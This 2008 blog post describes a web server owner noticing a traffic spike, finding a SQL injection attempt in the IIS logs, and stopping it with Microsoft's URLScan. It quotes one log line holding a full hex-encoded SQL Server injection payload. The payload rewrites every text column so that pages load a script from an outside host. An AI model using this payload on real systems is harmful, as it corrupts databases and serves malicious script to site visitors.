---
id: 301
title: 'Accessorize your Denial of Service or SQL Injection Attack'
date: '2008-08-11T08:43:35-04:00'
author: 'Rob Bazinet'
layout: post
guid: 'https://localhost/~rbazinet/?p=301'
permalink: /iis/accessorize-your-denial-of-service-or-sql-injection-attack/
categories:
    - IIS
---

 I was reading some posts on Twitter the past couple days and noticed some Tweets from [Phil Haack](https://twitter.com/haacked) and [Scott Hanselman](https://twitter.com/shanselman) regarding an attack on their web[![Hacked](https://accidentaltechnologist.com/files/media/image/WindowsLiveWriter/AccessorizeyourDenialofServiceorSQLInjec_9683/Hacked_thumb.jpg)](https://accidentaltechnologist.com/files/media/image/WindowsLiveWriter/AccessorizeyourDenialofServiceorSQLInjec_9683/Hacked_2.jpg) servers for their blogs which caused a large spike in traffic. They determined it was some type of [Distributed Denial of Service (DDOS) attack](https://en.wikipedia.org/wiki/Denial_of_service_attack). I decided to check out my own server which I host this site and to my surprise, the same thing had been happening to me all day with an increase in traffic 10x.

I reviewed my server logs and saw some really large QueryStrings being sent which looked like this:

> <font face="Courier New" size="1">2008-08-08 05:51:53 W3SVC2557 SV2419 74.86.230.234 GET /asp-net/feed/ ';DECLARE%20@S%20CHAR(4000);SET%20@S=CAST(0x4445434C415245204054207661726368617228323535292C40432076617263686172283430303029204445434C415245205461626C655F43757273   
> 6F7220435552534F5220464F522073656C65637420612E6E616D652C622E6E616D652066726F6D207379736F626A6563747320612C737973636F6C756   
> D6E73206220776865726520612E69643D622E696420616E6420612E78747970653D27752720616E642028622E78747970653D3939206F7220622E7874   
> 7970653D3335206F7220622E78747970653D323331206F7220622E78747970653D31363729204F50454E205461626C655F437572736F7220464554434   
> 8204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920   
> 424547494E20657865632827757064617465205B272B40542B275D20736574205B272B40432B275D3D5B272B40432B275D2B2727223E3C2F7469746C6   
> 53E3C736372697074207372633D22687474703A2F2F73646F2E313030306D672E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D   
> 272720776865726520272B40432B27206E6F74206C696B6520272725223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F73646   
> F2E313030306D672E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D272727294645544348204E4558542046524F4D2020546162   
> 6C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655   
> F437572736F72%20AS%20CHAR(4000));EXEC(@S); 80 - 69.180.0.90 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1;+SV1;   
> +Zango+10.3.74.0) - - accidentaltechnologist.com 200 0 0 27171 1514 3328</font>

It appears this is more of a SQL Injection attack and not just simply a DDOS. You can see the EXEC(@S) where they are trying to execute some nasty SQL on my server. [Rick Strahl has also had some similar problems](https://www.west-wind.com/weblog/posts/447503.aspx) and he addresses the issue in IIS 7.0.

Not being what to do, I went to Twitter, pinged Scott to see what he did to stop the attack and he suggested [URLScan from Microsoft](https://technet.microsoft.com/en-us/security/cc242650.aspx). Of course, this is tool I used to use back in the day of supporting clients web servers to help ward off unfriendly visitors. I had forgotten all about this tool until Scott mentioned it.

I downloaded URLScan from Microsoft and promptly installed it on my web server and the DDOS attack stopped almost instantly. The current version of URLScan is 2.5 which says it only works on IIS 6.0, but a beta version of [URLScan 3.0](https://www.microsoft.com/downloads/details.aspx?familyid=EE41818F-3363-4E24-9940-321603531989&displaylang=en) is available for IIS 5.1, 6.0, and 7.0.

Thank you [Scott](https://www.hanselman.com/blog/) for the quick reply and suggestion to fix my problem.

<div class="wlWriterSmartContent" id="scid:0767317B-992E-4b12-91E0-4F059A8CECA8:c061bd53-e034-4a9a-bf2b-1578f591c863" style="padding-right: 0px; display: inline; padding-left: 0px; float: none; padding-bottom: 0px; margin: 0px; padding-top: 0px">Technorati Tags: [Hackers](https://technorati.com/tags/Hackers),[DDOS](https://technorati.com/tags/DDOS),[URLScan](https://technorati.com/tags/URLScan),[IIS](https://technorati.com/tags/IIS),[SQL Injection](https://technorati.com/tags/SQL%20Injection)</div>